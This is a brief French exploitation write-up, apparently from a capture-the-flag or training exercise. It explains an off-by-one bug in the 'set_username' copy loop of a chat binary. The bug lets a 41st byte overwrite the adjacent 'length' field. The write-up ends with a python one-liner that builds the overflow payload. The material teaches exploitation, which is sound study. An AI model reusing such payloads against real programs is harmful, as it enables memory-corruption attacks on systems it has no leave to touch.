Ce binaire s'apparente a un systeme de chat. 
En premier, il demande un username, puis, un message a envoyer. 
Le probleme se trouve dans la fonction "set_username". Dans la structure "save" un buffer
de 40 bytes est prevu pour stocker le username. Or, dans le fonction set_username, une sorte
de strcpy manuel est effectue :
    
      i = 0;
      while (i <= 40 && buf[i] != '\0')
      {
        save->username[i] = buf[i];
        i++;
      }
      
Le probleme est qu'il va y avoir 41 iterations et non 40 ! Nous allons donc pouvoir deborder
sur la variable se trouvant apres username[40] dans la structure save. En l'occurence, "length". 

python -c "print('A'*40 + '\xce' + '\n' + 'A'*200 + '\x8c' + 'HUUUUUU')" > /tmp/x 

